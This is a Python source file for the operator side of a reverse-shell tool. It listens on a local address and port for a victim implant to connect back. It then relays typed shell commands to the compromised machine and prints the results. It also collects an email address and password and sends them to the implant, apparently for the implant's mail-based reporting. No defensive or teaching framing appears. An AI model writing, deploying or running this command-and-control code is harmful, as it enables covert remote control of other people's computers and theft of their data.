import socket
import signal
import os
import subprocess
import sys
import platform

cwd = ''

class Listener:
    def __init__(self,ip,port):
        try:
            self.ip = ip
            self.port = port
            self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.s.bind((ip, port))
            self.s.listen(0)
            print('[+] Listening for incoming connections...')
            self.connection, address = self.s.accept()
            print("[+] Connected")
            self.getPWD()
            self.commands()
        except Exception as e:
            print('[-] Error while connecting: ', e)

    def getPWD(self):
        global cwd
        pwd = 'pwd'
        self.connection.send(pwd.encode())
        cwd = self.connection.recv(8192)
        cwd = cwd.decode()

    def email_validation(self):
        while True:
            email = input("Enter your email: ")
            password = input("Enter your password: ")
            print("""
            Are these your email credentials?
            Email: {}
            Password: {}""".format(email, password))
            if input("Yes(y) or no(n)? ") == 'y':
                self.connection.send(("email_validation" + email + " " + password).encode())
                break

    def commands(self):
        global cwd
        self.email_validation()
        while True:
            try:
                result = input(platform.node() + ":" + cwd.rstrip() + '$ ')
                if result == 'quit':
                    self.connection.close()
                    print("[+] Quitting...")
                    break
                else:
                    self.connection.send(result.encode())
                    output = self.connection.recv(8192)
                    print(output.decode())
                    self.getPWD()
            except:
                pass

def exit_gracefully(signum, frame):
    # restore the original signal handler as otherwise evil things will happen
    # in raw_input when CTRL+C is pressed, and our signal handler is not re-entrant
    signal.signal(signal.SIGINT, original_sigint)

    try:
        if input("\nReally quit? (y/n)> ").lower().startswith('y'):
            sys.exit(1)

    except KeyboardInterrupt:
        print("[+] Quitting")
        sys.exit(1)

    # restore the exit gracefully handler here
    signal.signal(signal.SIGINT, exit_gracefully)

if __name__ == '__main__':
    original_sigint = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, exit_gracefully)
    while True:
        port = 9877
        try:
            listener = Listener("192.168.122.1", port)
            break
        except KeyboardInterrupt:
            break
        except:
            port += 1